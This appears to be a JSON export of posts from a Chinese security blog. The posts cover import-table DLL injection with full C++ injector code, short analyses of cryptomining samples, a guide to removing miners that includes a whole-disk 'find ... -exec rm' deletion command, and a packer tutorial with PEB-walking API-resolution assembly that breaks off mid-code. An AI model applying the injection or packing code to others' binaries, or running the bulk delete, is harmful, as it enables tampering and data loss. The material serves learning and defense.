{"posts":[{"title":"ring3注入学习(1)导入表注入","content":"原理 导入表的结构 在编程中常常用到“导入函数”(Import functions),导入函数就是被程序调用但其执行代码又不在程序中的函数，这些函数的代码位于一个或者多个DLL中，在调用者程序中只保留一些函数信息，包括函数名及其驻留的DLL名等。 于磁盘上的PE 文件来说，它无法得知这些输入函数在内存中的地址，只有当PE 文件被装入内存后，Windows 加载器才将相关DLL 装入，并将调用输入函数的指令和函数实际所处的地址联系起来。这就是“动态链接”的概念。动态链接是通过PE 文件中定义的“导入表”来完成的，导入表中保存的正是函数名和其驻留的DLL 名等。 导入表由一系列IMAGE_IMPORT_DESCRIPTOR结构体组成： 结构的数量取决于程序要使用的DLL文件的数量，每一个结构对应一个DLL文件 该结构体的定义如下： struct _IMAGE_IMPORT_DESCRIPTOR { union { DWORD Characteristics; DWORD OriginalFirstThunk; } DUMMYUNIONNAME; DWORD TimeDateStamp; DWORD ForwarderChain; DWORD Name;//导入模块名的RVA DWORD FirstThunk; } IMAGE_IMPORT_DESCRIPTOR; 具体在PE文件中，就像这个样子： 在IMAGE_IMPORT_DESCRIPTOR的结构体的最后面，附带着许多小结构体，里面记录的信息是该导入表的DLL要导入使用的API typedef struct _IMAGE_IMPORT_BY_NAME { WORD Hint; BYTE Name[1]; } IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME; 以上便是导入表的基础结构 导入表的注入 由《加密与解密》中得知。Windows装载PE文件时，会检查导入表，将导入表所包含要使用的DLL加载进程序中，这也就产生了一个DLL注入的点，如果将恶意DLL写入导入表中，就可以让程序在运行时调用恶意DLL中的代码，达到DLL注入的效果 实现 要实现导入表注入，需要把要注入的DLL构造的结构体塞进导入表里，但是由于导入表默认不是在PE文件的最后，所以导入表原来所在的位置不一定有足够大的空间塞入一个新的结构体，这时我们就需要把导入表移动到新的足够大的位置，有两种办法，扩大最后一个节和直接新增一个节，比较方便的方法是选择新增一个节，在新增节后将原导入表放进去，如何在最后写入自己的导入表，再新增8字节的INT和8字节IAT，至于为什么要增加8字节的INT表和8字节的IAT表，可以这样解释： 如图，当我们新写入一个IMAGE_IMPORT_DESCRIPTOR结构，我们就需要建立INT和IAT对于该结构的映射，此时就需要扩充IAT和INT表 具体实现步骤如下： 找到原导入表 在程序最后开辟一个新节（也可扩大最后一个节） 拷贝原来的导入表到新节中 在新节拷贝的导入表后新增一个导入表 增加8字节的INT表和8字节的IAT表 存储要注入的dll的名称 增加一个_IMAGE_IMPORT_BY_NAME结构，并将函数名称存进结构体第一个变量后的内存中_ 将_IMAGE_IMPORT_BY_NAME结构的地址的RVA赋值给INT表和IAT表第一项 将dll名称所在位置的首地址的RVA赋值给新增导入表的Name 修改IMAGE_DATA_DIRECTORY结构的VirtualAddress和Size 代码 DLL代码 // dllmain.cpp : 定义 DLL 应用程序的入口点。 #include &quot;pch.h&quot; extern &quot;C&quot; __declspec(dllexport) void puts() { MessageBoxA(0, &quot;hi&quot;, &quot;hello&quot;, 0); return; } BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: puts(); break; case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } 注入程序代码 #include&lt;Windows.h&gt; #include&lt;stdio.h&gt; #define DLLNAMELENGTH 0xE #define FUNCTIONNAMELENGTH 0xF #define FUNCTIONNAME &quot;puts&quot; #define DLLNAME &quot;Dll1.dll&quot; //获取DOS头 PIMAGE_DOS_HEADER GetDosHeader(_In_ char* pBase) { return PIMAGE_DOS_HEADER(pBase); } //获取NT头 PIMAGE_NT_HEADERS GetNtHeader(_In_ char* pBase) { return PIMAGE_NT_HEADERS(GetDosHeader(pBase)-&gt;e_lfanew + (SIZE_T)pBase); } //获取文件头 PIMAGE_FILE_HEADER GetFileHeader(_In_ char* pBase) { return &amp;(GetNtHeader(pBase)-&gt;FileHeader); } //获取OPT头 PIMAGE_OPTIONAL_HEADER32 GetOptHeader(_In_ char* pBase) { return &amp;(GetNtHeader(pBase)-&gt;OptionalHeader); } PIMAGE_SECTION_HEADER GetSecByName(_In_ char* pBase, _In_ const char* name) { DWORD Secnum = GetFileHeader(pBase)-&gt;NumberOfSections; PIMAGE_SECTION_HEADER Section = IMAGE_FIRST_SECTION(GetNtHeader(pBase)); char buf[10] = { 0 }; for (DWORD i = 0; i &lt; Secnum; i++) { memcpy_s(buf, 8, (char*)Section[i].Name, 8); if (!strcmp(buf, name)) { return Section + i; } } return nullptr; } //获取最后一个区段 PIMAGE_SECTION_HEADER GetLastSec(_In_ char* PeBase) { DWORD SecNum = GetFileHeader(PeBase)-&gt;NumberOfSections; PIMAGE_SECTION_HEADER FirstSec = IMAGE_FIRST_SECTION(GetNtHeader(PeBase)); PIMAGE_SECTION_HEADER LastSec = FirstSec + SecNum - 1; return LastSec; } char* OpenPeFiles(_In_ const char* Path, _Out_opt_ DWORD* nFileSize) { //读文件 HANDLE hFile = CreateFileA(Path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); if (hFile == INVALID_HANDLE_VALUE) { //printf(&quot;打开文件失败&quot;); return NULL; } DWORD PeSize = GetFileSize(hFile, NULL); if (nFileSize) *nFileSize = PeSize; DWORD ReadSize = 0; char* PeBase = new CHAR[PeSize]{ 0 }; ReadFile(hFile, PeBase, PeSize, &amp;ReadSize, NULL); PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)PeBase; //检测DOS头和NT头 if (pDosHeader-&gt;e_magic != IMAGE_DOS_SIGNATURE) { //printf(&quot;不是PE文件\\n&quot;); //system(&quot;pause&quot;); return NULL; } PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(PeBase + pDosHeader-&gt;e_lfanew); if (pNtHeader-&gt;Signature != IMAGE_NT_SIGNATURE) { //printf(&quot;不是PE文件\\n&quot;); //system(&quot;pause&quot;); return NULL; } CloseHandle(hFile); return PeBase; } //粒度对齐处理 int AlignMent(_In_ int size, _In_ int alignment) { return (size) % (alignment) == 0 ? (size) : ((size) / alignment + 1) * (alignment); } //新增节 char* AddSection(_In_ char*&amp; PeBase, _In_ DWORD&amp; PeSize, _In_ const char* Section_name, _In_ const int Section_size) { GetFileHeader(PeBase)-&gt;NumberOfSections++; PIMAGE_SECTION_HEADER LastPeSection = GetLastSec(PeBase); memcpy(LastPeSection-&gt;Name, Section_name, 8); LastPeSection-&gt;Misc.VirtualSize = Section_size; LastPeSection-&gt;VirtualAddress = (LastPeSection - 1)-&gt;VirtualAddress + AlignMent((LastPeSection - 1)-&gt;SizeOfRawData, GetOptHeader(PeBase)-&gt;SectionAlignment); LastPeSection-&gt;SizeOfRawData = AlignMent(Section_size, GetOptHeader(PeBase)-&gt;FileAlignment); LastPeSection-&gt;PointerToRawData = AlignMent(PeSize, GetOptHeader(PeBase)-&gt;FileAlignment); LastPeSection-&gt;Characteristics = 0xc0000040;//节表属性设为该值，意为该节表可读可写且包含已初始化的数据 GetOptHeader(PeBase)-&gt;SizeOfImage = LastPeSection-&gt;VirtualAddress + LastPeSection-&gt;SizeOfRawData; int NewSize = LastPeSection-&gt;PointerToRawData + LastPeSection-&gt;SizeOfRawData; char* NewPeBase = new char [NewSize] {0}; //向新缓冲区录入数据 memcpy(NewPeBase, PeBase, PeSize); //缓存区更替 delete PeBase; PeSize = NewSize; return NewPeBase; } //保存文件 void SaveFile(_In_ const char* path, _In_ const char* data, _In_ int FileSize) { HANDLE hFile = CreateFileA( path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL ); DWORD Buf = 0; WriteFile(hFile, data, FileSize, &amp;Buf, NULL); CloseHandle(hFile); } //将RVA的值转换成FOA LPVOID RvaToFoa(LPVOID pFileBuffer, LPSTR virtualAddress) { LPSTR sectionAddress = NULL;//记录距离节头的距离 LPSTR fileAddress = NULL;//记录文件中的偏移 PIMAGE_DOS_HEADER pDosHeader = NULL; PIMAGE_NT_HEADERS pNTHeader = NULL; PIMAGE_FILE_HEADER pPEHeader = NULL; PIMAGE_OPTIONAL_HEADER32 pOptionHeader = NULL; PIMAGE_SECTION_HEADER pSectionHeader = NULL; if (pFileBuffer == NULL) { printf(&quot;文件写入内存失败!\\n&quot;); return NULL; } pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer; pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pFileBuffer + pDosHeader-&gt;e_lfanew); pPEHeader = (PIMAGE_FILE_HEADER)((DWORD)pNTHeader + 4); pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pPEHeader + 20); pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader + pPEHeader-&gt;SizeOfOptionalHeader); if ((DWORD)virtualAddress &lt;= pOptionHeader-&gt;SizeOfHeaders) { return virtualAddress; } for (DWORD i = 1; i &lt;= pPEHeader-&gt;NumberOfSections; i++) { if ((DWORD)virtualAddress &lt; pSectionHeader-&gt;VirtualAddress) { pSectionHeader--; break; } else if (i == pPEHeader-&gt;NumberOfSections) { break; } else { pSectionHeader++; } } //距离该节头的距离 sectionAddress = virtualAddress - pSectionHeader-&gt;VirtualAddress; fileAddress = pSectionHeader-&gt;PointerToRawData + sectionAddress; return (LPVOID)fileAddress; } //将FOA的值转换成RVA LPVOID FoaToRva(LPVOID pFileBuffer, LPSTR fileaddress) { LPSTR sectionAddress = NULL;//记录距离节头的距离 LPSTR virtualaddress = NULL;//记录内存中的偏移 PIMAGE_DOS_HEADER pDosHeader = NULL; PIMAGE_NT_HEADERS pNTHeader = NULL; PIMAGE_FILE_HEADER pPEHeader = NULL; PIMAGE_OPTIONAL_HEADER32 pOptionHeader = NULL; PIMAGE_SECTION_HEADER pSectionHeader = NULL; if (pFileBuffer == NULL) { printf(&quot;文件写入内存失败!\\n&quot;); return NULL; } pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer; pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pFileBuffer + pDosHeader-&gt;e_lfanew); pPEHeader = (PIMAGE_FILE_HEADER)((DWORD)pNTHeader + 4); pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pPEHeader + 20); pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader + pPEHeader-&gt;SizeOfOptionalHeader); if ((DWORD)fileaddress &lt;= pOptionHeader-&gt;SizeOfHeaders) { return fileaddress; } for (DWORD i = 1; i &lt;= pPEHeader-&gt;NumberOfSections; i++) { if ((DWORD)fileaddress &lt; pSectionHeader-&gt;PointerToRawData) { pSectionHeader--; break; } else if (i == pPEHeader-&gt;NumberOfSections) { break; } else { pSectionHeader++; } } //距离该节头的距离 sectionAddress = fileaddress - pSectionHeader-&gt;PointerToRawData; virtualaddress = pSectionHeader-&gt;VirtualAddress + sectionAddress; return (LPVOID)virtualaddress; } char* inject_dll(_In_ char*&amp; PeBase, _In_ DWORD&amp; PeSize) { PIMAGE_DATA_DIRECTORY pDataDirectory = NULL;//定位表目录 PIMAGE_IMPORT_DESCRIPTOR importTableAddress = NULL;//定位导入表的真正位置 LPVOID returnAddress = NULL;//记录RVAtoFOA的返回值 //定位到新节的位置和导入表的位置 pDataDirectory = (PIMAGE_DATA_DIRECTORY)GetOptHeader(PeBase)-&gt;DataDirectory; pDataDirectory += 0x1; DWORD sectionLength = pDataDirectory-&gt;Size + 0x28 + +0x10 + DLLNAMELENGTH + FUNCTIONNAMELENGTH + 0x2; sectionLength = AlignMent(sectionLength, GetOptHeader(PeBase)-&gt;FileAlignment); char SecName[] = &quot;.ddjsq&quot;; char* NewPeBase = AddSection(PeBase, PeSize, SecName, sectionLength); pDataDirectory = (PIMAGE_DATA_DIRECTORY)GetOptHeader(NewPeBase)-&gt;DataDirectory; pDataDirectory += 0x1; PDWORD pNewSection = (PDWORD)(GetLastSec(NewPeBase)-&gt;PointerToRawData + (DWORD)NewPeBase); returnAddress = RvaToFoa(NewPeBase, (LPSTR)pDataDirectory-&gt;VirtualAddress); importTableAddress = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)returnAddress + (DWORD)NewPeBase); //复制原导入表，在原导入表后新增一个导入表 memcpy(pNewSection, importTableAddress, pDataDirectory-&gt;Size); importTableAddress = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)pNewSection + pDataDirectory-&gt;Size - 0x14); //增加8字节INT表 PIMAGE_THUNK_DATA32 pIntTable = (PIMAGE_THUNK_DATA32)((DWORD)importTableAddress + 0x28);//保留20字节的0 PIMAGE_THUNK_DATA32 repairIntTable = pIntTable; pIntTable++; pIntTable-&gt;u1.Ordinal = 0x0; pIntTable++; //增加8字节IAT表 PIMAGE_THUNK_DATA32 pIatTable = (PIMAGE_THUNK_DATA32)(pIntTable); PIMAGE_THUNK_DATA32 repairIatTable = pIatTable; pIatTable++; pIatTable-&gt;u1.Ordinal = 0x0; pIatTable++; //分配空间存储DLL名称字符串 PDWORD dllNameAddress = (PDWORD)pIatTable; memcpy(dllNameAddress, DLLNAME, DLLNAMELENGTH); //增加IMAGE_IMPORT_BY_NAME 结构 PIMAGE_IMPORT_BY_NAME functionNameAddress = (PIMAGE_IMPORT_BY_NAME)((DWORD)dllNameAddress + DLLNAMELENGTH); PDWORD pFunctionName = (PDWORD)((DWORD)functionNameAddress + 0x2); memcpy(pFunctionName, FUNCTIONNAME, FUNCTIONNAMELENGTH); //将IMAGE_IMPORT_BY_NAME结构的RVA赋值给INT和IAT表中的第一项 repairIntTable-&gt;u1.AddressOfData = (DWORD)FoaToRva(NewPeBase, (LPSTR)((DWORD)functionNameAddress - (DWORD)NewPeBase)); repairIatTable-&gt;u1.AddressOfData = repairIntTable-&gt;u1.Ordinal; //修正导入表Name、OriginalFirstThunk、FirstThunk importTableAddress-&gt;Name = (DWORD)FoaToRva(NewPeBase, (LPSTR)((DWORD)dllNameAddress - (DWORD)NewPeBase)); importTableAddress-&gt;OriginalFirstThunk = (DWORD)FoaToRva(NewPeBase, (LPSTR)((DWORD)repairIntTable - (DWORD)NewPeBase)); importTableAddress-&gt;FirstThunk = (DWORD)FoaToRva(NewPeBase, (LPSTR)((DWORD)repairIatTable - (DWORD)NewPeBase)); //修正IMAGE_DATA_DIRECTORY结构的VirtualAddress和Size pDataDirectory-&gt;VirtualAddress = (DWORD)FoaToRva(NewPeBase, (LPSTR)((DWORD)pNewSection - (DWORD)NewPeBase)); pDataDirectory-&gt;Size += 0x14; return NewPeBase; } int main() { char path[] = &quot;路径&quot;; DWORD pesize; char* PeBase = OpenPeFiles(path, &amp;pesize); if (!PeBase) { printf(&quot;wrong&quot;); return 0; } char* NewPeBase = inject_dll(PeBase, pesize); SaveFile(&quot;路径&quot;, NewPeBase, pesize); } 运行结果 注入前 注入后 运行时 防范手段 由于是静态注入，直接修改了exe文件，所以可使用校验的方式去检测有无被注入 ","link":"https://tickertapetimer.github.io/post/ring3注入学习(1)导入表注入/"},{"title":"Windows挖矿样本分析","content":"前言 又搞到一个挖矿样本，是Windows的，看看里面有啥 云沙箱 先丢微步云沙箱分析一手 沙箱检测有壳 拖exeinfo看看 好嘛，是个大壳，先放一边，接着看沙箱检测结果 矿池啊，那没事了 ","link":"https://tickertapetimer.github.io/post/一个Windows挖矿样本/"},{"title":"防御病毒经验","content":"前言 今天打比赛，要用到我的服务器，所以我时隔一个多月，再一次打开宝塔，不看不知道，一看吓一跳，好家伙，CPU直接拉满，看一眼监控，连续拉满十多天了，这波被白嫖给人挖了两星期的矿，而在删挖矿病毒的时候，我也学到了一些基本的挖矿病毒排查应对的技巧，记录一下 基础操作 列出进程 对于一般的挖矿病毒，直接top，就可以看到它排在最上面，但是对于一些高级病毒，它可能会有相对应的隐藏操作，比如说修改你的top命令的源代码，让你不能用top找到它，这个时候就要用到一些第三方工具，比如说htop之类的 删除进程（一般是没用的 删除进程killall -9 &lt;name&gt; 一般来说，找到进程之后，就是删除进程，然后删除文件，但对于挖矿病毒来说，它们基本上都很难删掉，因为它们有守护进程 守护进程 守护进程(daemon)是生存期长的一种进程,没有控制终端.它们常常在系统引导装入时启动,仅在系统关闭时才终止.UNIX系统有很多守护进程,守护进程程序的名称通常以字母“d”结尾:例如,syslogd 就是指管理系统日志的守护进程. 守护进程的存在，使得我们在删除主进程的时候，它会再次唤起主进程，接着挖 那把守护进程删了呢？这有用吗？ 答案大多数时候也是没有的，因为它可能还有一层保护，计划任务 计划任务 Linux查看计划任务的命令是crontab -u &lt;用户名&gt;,该命令可以显示出当前用户或者指定用户的计划任务，想要删除病毒，就必须要将计划任务删干净，crontab -e是负责删除计划任务的命令 删除了计划任务、守护进程、主进程后，基本就算成功删除这个病毒了 花操作 病毒自删 一些高级的病毒，会在病毒启动后，把文件给删掉，这个时候你去看对应的进程对应的文件，会发现它已经删掉了 就像这样 这就导致删除文件不能防御病毒，只能通过删除进程去杀毒 定时任务有副本 对于一些更高级的病毒，删除定时任务的操作已经不能完全将它们删掉，因为它们在渗透进服务器启动病毒的时候，可能会将定时任务复制出来一个副本，用那个副本去定时刷新转移它自身，再删除自己，导致清除难度加大 但这种操作有一个小漏洞可以利用，那就是它们复制转移的文件大小都是固定的，只要将它的大小用du -b &lt;定时任务文件路径&gt;记录下来，用find / -size &lt;文件大小&gt;c -type f -exec rm {} \\;搜索全盘，一把梭全删了就可以，删除之后，就可以着手删除主进程和守护进程 LD_PRELOAD隐藏进程 这个病毒操作还没见到，但是查资料看到这个操作，记录一下 「应急响应：记一次花样贼多的挖矿病毒」 Windows挖矿病毒 对于Windows的挖矿病毒，一般都可以用杀毒软件直接粉碎掉，但是如果没有杀毒软件，且防火墙检测不到，那就要手动删了，一些病毒会放置在C盘，且你没有办法删除，因为它在被进程占用，这个时候，可以通过更改文件名的方法删除它，将其更改后缀，然后结束进程，这样程序就不能再次启动，然后就可以删除病毒文件了。 ","link":"https://tickertapetimer.github.io/post/服务器防御病毒经验/"},{"title":"Linux挖矿病毒分析","content":"前言 给服务器清除挖矿病毒的时候，顺手把定时任务下下来了，逆向一手看看 初步分析 脱壳 是64位elf文件，拖进IDA，有壳 看起来是压缩壳，尝试一手upx 还真是，彳亍吧 逆向分析 再次拖进IDA 进入主函数 一连串的CPUID汇编指令，且每一串的指令的初始值（即指令上方的_RAX参数）都不同 三个CPUID指令的初始值分别为0、1、7 他们分别返回的值为： EAX=0：获取CPU的Vendor ID Vendor ID是制造商的标识，用下面的方法执行该功能： 执行CPUID指令后，AX中返回的内容前面已经说过了，返回的Vendor ID固定为12个ASCII字符依次存放在EBX、EDX、ECX中，对于Intel的CPU，返回的字符串永远是：GenuineIntel EAX=1：处理器签名（Processor Signiture）和功能（Feature）位 执行完成后，处理器签名放在EAX中，功能位及其它杂七杂八的内容分别放在EBX、ECX和EDX中 通过处理器签名，可以确定CPU的具体型号 ","link":"https://tickertapetimer.github.io/post/一个Linux挖矿样本分析/"},{"title":"壳的自我修养","content":"前言 代码流程 加载要加壳的PE文件到内存 加载壳代码（通常为DLL文件）到内存 查找PE文件各数据段 新增段 往段里写入壳代码数据 设置程序入口点 代码 main.cpp #include&lt;Windows.h&gt; #include&lt;stdio.h&gt; #include &lt;tchar.h&gt; #include&quot;PE.h&quot; int main() { char path[] = &quot;D:\\\\桌面\\\\壳\\\\010手动加壳\\\\Project1.exe&quot;; //char path[] = &quot;D:\\\\桌面\\\\壳\\\\010手动加壳\\\\test.docx&quot;; DWORD pesize; char* PeBase = OpenPeFiles(path, &amp;pesize); if (!PeBase) { printf(&quot;wrong&quot;); return 0; } DLLinfo dll = { 0 }; LoadDLL(&amp;dll); DWORD textRVA = GetSecByName(PeBase, &quot;.text&quot;)-&gt;VirtualAddress; DWORD textSize = GetSecByName(PeBase, &quot;.text&quot;)-&gt;Misc.VirtualSize; //Encry(PeBase, dll); char SecName[] = &quot;.ddjsq&quot;; char* NewPeBase = AddSection(PeBase, pesize, SecName, GetSecByName(dll.dllbase, &quot;.text&quot;)-&gt;Misc.VirtualSize); FixDLL(GetOptHeader(NewPeBase)-&gt;ImageBase, (DWORD)dll.dllbase, GetLastSec(NewPeBase)-&gt;VirtualAddress, GetSecByName(dll.dllbase, &quot;.text&quot;)-&gt;VirtualAddress); dll.pStubConf-&gt;srcOep = GetOptHeader(NewPeBase)-&gt;AddressOfEntryPoint; printf(&quot;入 口 点:\\t%08X\\t&quot;, dll.pStubConf-&gt;srcOep); memcpy(GetLastSec(NewPeBase)-&gt;PointerToRawData + NewPeBase, GetSecByName(dll.dllbase, &quot;.text&quot;)-&gt;VirtualAddress + dll.dllbase, GetSecByName(dll.dllbase, &quot;.text&quot;)-&gt;Misc.VirtualSize); GetOptHeader(NewPeBase)-&gt;AddressOfEntryPoint = dll.pfnStart - (DWORD)dll.dllbase - GetSecByName(dll.dllbase, &quot;.text&quot;)-&gt;VirtualAddress + GetLastSec(NewPeBase)-&gt;VirtualAddress; printf(&quot;入 口 点:\\t%08X\\t&quot;, GetOptHeader(NewPeBase)-&gt;AddressOfEntryPoint); GetOptHeader(NewPeBase)-&gt;DllCharacteristics &amp;= (~0x40); SaveFile(&quot;D:\\\\桌面\\\\壳\\\\010手动加壳\\\\test000.exe&quot;, NewPeBase, pesize); return 0; } PE.h #include &lt;Windows.h&gt; //获取DOS头 PIMAGE_DOS_HEADER GetDosHeader(_In_ char* pBase) { return PIMAGE_DOS_HEADER(pBase); } //获取NT头 PIMAGE_NT_HEADERS GetNtHeader(_In_ char* pBase) { return PIMAGE_NT_HEADERS(GetDosHeader(pBase)-&gt;e_lfanew + (SIZE_T)pBase); } //获取文件头 PIMAGE_FILE_HEADER GetFileHeader(_In_ char* pBase) { return &amp;(GetNtHeader(pBase)-&gt;FileHeader); } //获取OPT头 PIMAGE_OPTIONAL_HEADER32 GetOptHeader(_In_ char* pBase) { return &amp;(GetNtHeader(pBase)-&gt;OptionalHeader); } PIMAGE_SECTION_HEADER GetSecByName(_In_ char* pBase, _In_ const char* name) { DWORD Secnum = GetFileHeader(pBase)-&gt;NumberOfSections; PIMAGE_SECTION_HEADER Section = IMAGE_FIRST_SECTION(GetNtHeader(pBase)); char buf[10] = { 0 }; for (DWORD i = 0; i &lt; Secnum; i++) { memcpy_s(buf, 8, (char*)Section[i].Name, 8); if (!strcmp(buf, name)) { return Section + i; } } return nullptr; } //加载加壳的pe char* OpenPeFiles(_In_ const char* Path, _Out_opt_ DWORD* nFileSize) { //读文件 HANDLE hFile = CreateFileA(Path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); if (hFile == INVALID_HANDLE_VALUE) { //printf(&quot;打开文件失败&quot;); return NULL; } DWORD PeSize = GetFileSize(hFile, NULL); if (nFileSize) *nFileSize = PeSize; DWORD ReadSize = 0; char* PeBase = new CHAR[PeSize]{ 0 }; ReadFile(hFile, PeBase, PeSize, &amp;ReadSize, NULL); PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)PeBase; //检测DOS头和NT头 if (pDosHeader-&gt;e_magic != IMAGE_DOS_SIGNATURE) { //printf(&quot;不是PE文件\\n&quot;); //system(&quot;pause&quot;); return NULL; } PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(PeBase + pDosHeader-&gt;e_lfanew); if (pNtHeader-&gt;Signature != IMAGE_NT_SIGNATURE) { //printf(&quot;不是PE文件\\n&quot;); //system(&quot;pause&quot;); return NULL; } CloseHandle(hFile); return PeBase; } //粒度对齐处理 int AlignMent(_In_ int size, _In_ int alignment) { return (size) % (alignment) == 0 ? (size) : ((size) / alignment + 1) * (alignment); } //获取最后一个区段 PIMAGE_SECTION_HEADER GetLastSec(_In_ char* PeBase) { DWORD SecNum = GetFileHeader(PeBase)-&gt;NumberOfSections; PIMAGE_SECTION_HEADER FirstSec = IMAGE_FIRST_SECTION(GetNtHeader(PeBase)); PIMAGE_SECTION_HEADER LastSec = FirstSec + SecNum - 1; return LastSec; } //新增区段 char* AddSection(_In_ char*&amp; PeBase, _In_ DWORD&amp; PeSize, _In_ const char* Section_name, _In_ const int Section_size) { GetFileHeader(PeBase)-&gt;NumberOfSections++; PIMAGE_SECTION_HEADER LastPeSection = GetLastSec(PeBase); memcpy(LastPeSection-&gt;Name, Section_name, 8); LastPeSection-&gt;Misc.VirtualSize = Section_size; LastPeSection-&gt;VirtualAddress = (LastPeSection - 1)-&gt;VirtualAddress + AlignMent((LastPeSection - 1)-&gt;SizeOfRawData, GetOptHeader(PeBase)-&gt;SectionAlignment); LastPeSection-&gt;SizeOfRawData = AlignMent(Section_size, GetOptHeader(PeBase)-&gt;FileAlignment); LastPeSection-&gt;PointerToRawData = AlignMent(PeSize, GetOptHeader(PeBase)-&gt;FileAlignment); LastPeSection-&gt;Characteristics = 0xE00000E0; GetOptHeader(PeBase)-&gt;SizeOfImage = LastPeSection-&gt;VirtualAddress + LastPeSection-&gt;SizeOfRawData; int NewSize = LastPeSection-&gt;PointerToRawData + LastPeSection-&gt;SizeOfRawData; char* NewPeBase = new char [NewSize] {0}; //向新缓冲区录入数据 memcpy(NewPeBase, PeBase, PeSize); //缓存区更替 delete PeBase; PeSize = NewSize; return NewPeBase; } //保存文件 void SaveFile(_In_ const char* path, _In_ const char* data, _In_ int FileSize) { HANDLE hFile = CreateFileA( path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL ); DWORD Buf = 0; WriteFile(hFile, data, FileSize, &amp;Buf, NULL); CloseHandle(hFile); } typedef struct _DLLconf { DWORD srcOep; //入口点 DWORD textScnRVA; //代码段RVA DWORD textScnSize; //代码段的大小 DWORD key; //解密密钥 }DLLconf; struct DLLinfo { char* dllbase; //stub.dll的加载基址 DWORD pfnStart; //stub.dll(start)导出函数的地址 DLLconf* pStubConf; //stub.dll(g_conf)导出全局变量的地址 }; //加载DLL void LoadDLL(_In_ DLLinfo* dll) { dll-&gt;dllbase = (char*)LoadLibraryEx(L&quot;D:\\\\桌面\\\\壳\\\\Dll1\\\\Release\\\\DLL1.dll&quot;, NULL, DONT_RESOLVE_DLL_REFERENCES); dll-&gt;pfnStart = (DWORD)GetProcAddress((HMODULE)dll-&gt;dllbase, &quot;Start&quot;); dll-&gt;pStubConf = (DLLconf*)GetProcAddress((HMODULE)dll-&gt;dllbase, &quot;g_conf&quot;); } //修复dll的重定位 void FixDLL(DWORD targetDllbase, DWORD stubDllbase, DWORD targetNewScnRva, DWORD stubTextRva) { //找到stub.dll的重定位表 DWORD dwRelRva = GetOptHeader((char*)stubDllbase)-&gt;DataDirectory[5].VirtualAddress; IMAGE_BASE_RELOCATION* pRel = (IMAGE_BASE_RELOCATION*)(dwRelRva + stubDllbase); //遍历重定位表 while (pRel-&gt;SizeOfBlock) { struct TypeOffset { WORD offset : 12; WORD type : 4; }; TypeOffset* pTypeOffset = (TypeOffset*)(pRel + 1); DWORD dwCount = (pRel-&gt;SizeOfBlock - 8) / 2; //需要重定位的数量 for (int i = 0; i &lt; dwCount; i++) { if (pTypeOffset[i].type != 3) { continue; } //需要重定位的地址 DWORD* pFixAddr = (DWORD*)(pRel-&gt;VirtualAddress + pTypeOffset[i].offset + stubDllbase); DWORD dwOld; //修改属性为可写 VirtualProtect(pFixAddr, 4, PAGE_READWRITE, &amp;dwOld); //去掉dll当前加载基址 *pFixAddr -= stubDllbase; //去掉默认的段首RVA *pFixAddr -= stubTextRva; //换上目标文件的加载基址 *pFixAddr += targetDllbase; //加上新区段的段首RVA *pFixAddr += targetNewScnRva; //把属性修改回去 VirtualProtect(pFixAddr, 4, dwOld, &amp;dwOld); } //切换到下一个重定位块 pRel = (IMAGE_BASE_RELOCATION*)((DWORD)pRel + pRel-&gt;SizeOfBlock); } } dll.cpp // dllmain.cpp : 定义 DLL 应用程序的入口点。 #pragma comment(linker, &quot;/merge:.data=.text&quot;) #pragma comment(linker, &quot;/merge:.rdata=.text&quot;) #pragma comment(linker, &quot;/section:.text,RWE&quot;) #include&lt;Windows.h&gt; #include&quot;pch.h&quot; //#include&quot;D:\\\\桌面\\\\壳\\\\loadpack\\\\PE.h&quot; typedef struct _DLLconf { DWORD srcOep; //入口点 DWORD textScnRVA; //代码段RVA DWORD textScnSize; //代码段的大小 DWORD key; //解密密钥 }DLLconf; //导出一个全局变量 extern &quot;C&quot; __declspec(dllexport)DLLconf g_conf = { 0 }; //定义函数指针和变量 typedef void* (WINAPI* FnGetProcAddress)(HMODULE, const char*); FnGetProcAddress MyGetProcAddress; typedef void* (WINAPI* FnLoadLibraryA)(char*); FnLoadLibraryA MyLoadLibraryA; typedef void* (WINAPI* FnVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD); FnVirtualProtect MyVirtualProtect; void GetApis() { HMODULE hKernel32; _asm { pushad; ; //获取kernel32.dll的加载基址; ;// 1. 找到PEB的首地址; mov eax, fs: [0x30] ; mov eax, [eax + 0ch]; mov eax, [eax + 0ch]; mov eax, [eax]; mov eax, [eax]; mov eax, [eax + 018h]; mov hKernel32, eax; mov ebx, [eax + 03ch]; add ebx, eax; add ebx, 078h; mov ebx, [ebx]; add ebx, eax; lea ecx, [ebx + 020h]; mov ecx, [ecx]; // ecx =&gt; 名称表的首地址(rva); add ecx, eax; // ecx =&gt; 名称表的首地址(va); xor edx, edx; // 作为index来使用. _WHILE:; mov esi, [ecx + edx * 4]; lea esi, [esi + eax]; cmp dword ptr[esi], 050746547h; 47657450 726F6341 64647265 7373; jne _LOOP; cmp dword ptr[esi + 4], 041636f72h; jne _LOOP; cmp dword 